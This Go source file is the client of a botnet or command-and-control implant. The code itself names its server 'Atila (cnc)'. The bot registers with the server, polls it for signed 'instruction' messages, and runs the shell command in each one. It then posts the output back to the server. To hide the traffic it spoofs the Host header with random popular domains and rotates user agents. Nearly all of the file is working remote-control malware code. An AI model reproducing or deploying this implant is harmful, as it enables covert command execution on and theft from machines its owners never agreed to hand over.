package main

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os/exec"
	"strings"

	"github.com/golang-jwt/jwt"
)

// Content of reply message.
type ParsedMessageContnet struct {
	Shell string `json:"shell"` // Shell code.
}

// Message received from the server.
type Message struct {
	Id      string `json:"id"`      // Unique identifier.
	From    string `json:"from"`    // Node which originally issued the message.
	To      string `json:"to"`      // Which node should receive message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	Status  string `json:"status"`  // Message's state.
	ReplyTo string `json:"replyTo"` // Original message ID.
}

// Message going towards the server.
type ReplyMessage struct {
	From    string `json:"from"`    // Node which originally issued the message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	ReplyTo string `json:"replyTo"` // Message ID.
}

// IdentifyPayload is a structure corresponding to Atila's bot identification endpoint.
type IdentifyPayload struct {
	Id        string `json:"id"`        // UUID of the bot. (self-generated)
	PublicKey string `json:"publicKey"` // Public key of the bot.
	Status    string `json:"status"`    // Bot's status.
}

// Payload for endpoint of Atila for message's ack.
type MessageAck struct {
	Id     string `json:"id"`
	Status string `json:"status"`
}

// identify makes the bot known to the Atila server. Returns true if identification was successful.
func identify(id string, publicKey *rsa.PublicKey) bool {
	// Bot's identification details which will be stored in the Atila's database.
	details := IdentifyPayload{
		Id:        id,
		PublicKey: publicKeyToPEM(publicKey),
		Status:    "ALIVE",
	}

	detailsJson, err := json.Marshal(details)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	payloadJson, err := serializedTraffic(string(detailsJson))
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	request, err := http.NewRequest("POST", atilaHost+"/v1/clients", bytes.NewBuffer([]byte(payloadJson)))
	request.Host = randomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", randomUserAgent())
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer request.Body.Close()

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer response.Body.Close()

	// Any status code other than 200 is a failure.
	if response.StatusCode != 200 {
		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode))
		return false
	}

	return true
}

// inboxReader is a loop of fetching and interpreting messages.
// Returns true if the operation was successful, false if it didn't.
func inboxReader(id string) bool {
	messages := fetchMessages(id)

	for _, message := range messages {
		reply, err := interpretMessage(message)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		err = sendMessage(reply)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		err = messageAck(reply.ReplyTo)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
	}

	return true
}

// messageAck changes a message's state. This will prevent the Atila from sending that message again.
func messageAck(messageId string) error {
	messageAck := MessageAck{
		Id:     messageId,
		Status: "SEEN",
	}

	messageAckJson, err := json.Marshal(messageAck)
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", atilaHost+"/v1/messages/ack", bytes.NewBuffer(messageAckJson))
	request.Host = randomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", randomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}

	defer response.Body.Close()

	return nil
}

// sendMessage makes a POST request to Atila which saves the message reply.
func sendMessage(message Message) error {
	insertionJson, err := json.Marshal(message)
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", atilaHost+"/v1/messages", bytes.NewBuffer(insertionJson))
	request.Host = randomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", randomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	return nil
}

// interpretMessage given the message it will generate a reply message.
func interpretMessage(message Message) (Message, error) {
	var reply Message = Message{
		From:    message.To,
		ReplyTo: message.Id,
	}

	if message.Subject != "instruction" {
		return reply, errors.New("unrecognized message subject")
	}

	// Message's content.
	content := ParsedMessageContnet{}

	// Verify the message's content.
	token, err := jwt.Parse(message.Content, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
			return nil, errors.New("invalid signing algorithm")
		}
		return trustedPublicKey, nil
	})
	if err != nil {
		return reply, err
	}
	if claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
		if claims["shell"] != nil {
			content.Shell = fmt.Sprint(claims["shell"])
		}
	} else {
		return reply, errors.New("invalid token's signature")
	}

	// Execute content.
	cmd := exec.Command(strings.TrimSuffix(content.Shell, "\n"))
	var out bytes.Buffer
	cmd.Stdout = &out

	err = cmd.Run()
	if err != nil {
		fmt.Println(err.Error())
		return reply, err
	}

	replyToken := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.MapClaims{
		"shell-output": out.String(),
	})

	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
	if err != nil {
		fmt.Println(err.Error())
		return reply, err
	}

	reply.Subject = "shell-output"
	reply.Content = replyTokenString

	return reply, nil
}

// fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
// Do remember to ack. the message after interpreting it and issue the response.
func fetchMessages(id string) []Message {
	request, err := http.NewRequest("GET", atilaHost+"/v1/messages?status=SENT&clientId="+id, nil)
	request.Host = randomPopularDomain()
	request.Header.Set("User-Agent", randomUserAgent())
	if err != nil {
		fmt.Println(err.Error())
	}

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err.Error())
	}
	defer response.Body.Close()

	jsonDecoder := json.NewDecoder(response.Body)
	jsonDecoder.DisallowUnknownFields()

	var messages []Message

	jsonErr := jsonDecoder.Decode(&messages)
	if jsonErr != nil {
		fmt.Println(jsonErr.Error())
	}

	return messages
}
